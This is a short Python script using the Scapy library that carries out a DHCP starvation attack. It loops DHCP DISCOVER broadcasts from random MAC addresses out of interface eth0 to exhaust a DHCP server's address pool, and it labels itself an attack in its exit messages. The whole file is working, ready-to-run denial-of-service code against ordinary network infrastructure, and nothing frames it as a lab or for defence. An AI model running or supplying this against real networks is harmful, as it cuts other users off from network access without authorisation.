from scapy.all import *



#Chek if the user doesn't run the program with super user privileges
if os.geteuid() != 0:
    print("\n=========================================================================\n")
    print("\033[1;31mAccess denied, you neet ROOT permissions. Try running the program with sudo.\033[0m")
    exit()


#conf.checkIPaddr needs to be set to False. 
#When conf.checkIpaddr the reponse IP isn't checked against sending IP address. Don't need to match.	
conf.checkIPaddr = False

#Create DHCP discover with destination IP = broadadcast
#Source MAC address is a random MAC address
#Source IP address = 0.0.0.0
#Destination IP address = broadcast
#Source port = 68 (DHCP / BOOTP Client)
#Destination port = 67 (DHCP / BOOTP Server)
#DHCP message type is discover
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])


try:
    #Send packet out of eth0 and loop the packet
    sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
    
except KeyboardInterrupt:
    print("\n\n\033[1;31mStopping the attack!\033[0m")
    print("\n\033[1mShutting down the program safely...\033[0m")
    print("\n\033[1;32mThank you!\033[0m")